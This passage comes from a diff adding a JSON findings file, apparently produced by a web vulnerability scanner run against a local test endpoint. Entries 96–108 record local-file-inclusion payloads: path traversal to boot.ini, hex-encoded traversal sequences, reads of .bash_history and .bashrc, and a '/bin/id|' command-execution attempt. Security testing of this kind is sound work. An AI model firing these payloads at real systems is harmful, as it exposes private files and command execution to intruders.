+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:48",
+        "unix_timestamp": 1770474468
+      }
+    },
+    {
+      "id": 97,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/../../../../../../../../bin/id|",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:48",
+        "unix_timestamp": 1770474468
+      }
+    },
+    {
+      "id": 98,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/..\\../..\\../..\\../..\\../..\\../..\\../boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:48",
+        "unix_timestamp": 1770474468
+      }
+    },
+    {
+      "id": 99,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:49",
+        "unix_timestamp": 1770474469
+      }
+    },
+    {
+      "id": 100,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/.bash_history",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:49",
+        "unix_timestamp": 1770474469
+      }
+    },
+    {
+      "id": 101,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/.bash_profile",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:50",
+        "unix_timestamp": 1770474470
+      }
+    },
+    {
+      "id": 102,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/.bashrc",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:50",
+        "unix_timestamp": 1770474470
+      }
+    },
+    {
+      "id": 103,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/0x2e0x2e0x2f0x2e0x2e0x2f{FILE}",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:50",
+        "unix_timestamp": 1770474470
+      }
+    },
+    {
+      "id": 104,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/0x2e0x2e0x2f{FILE}",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:51",
+        "unix_timestamp": 1770474471
+      }
+    },
+    {
+      "id": 105,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:52",
+        "unix_timestamp": 1770474472
+      }
+    },
+    {
+      "id": 106,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/./././././././././././boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:52",
+        "unix_timestamp": 1770474472
+      }
+    },
+    {
+      "id": 107,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:52",
+        "unix_timestamp": 1770474472
+      }
+    },
+    {
+      "id": 108,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:52",
+        "unix_timestamp": 1770474472
+      }
+    }
+  ],
+  "total_vulnerabilities": 108,
+  "total_by_type": {
+    "xss": 16,
+    "sqli": 72,
+    "lfi": 20
+  },
+  "last_updated": "2026-02-07 15:27:52"
+}
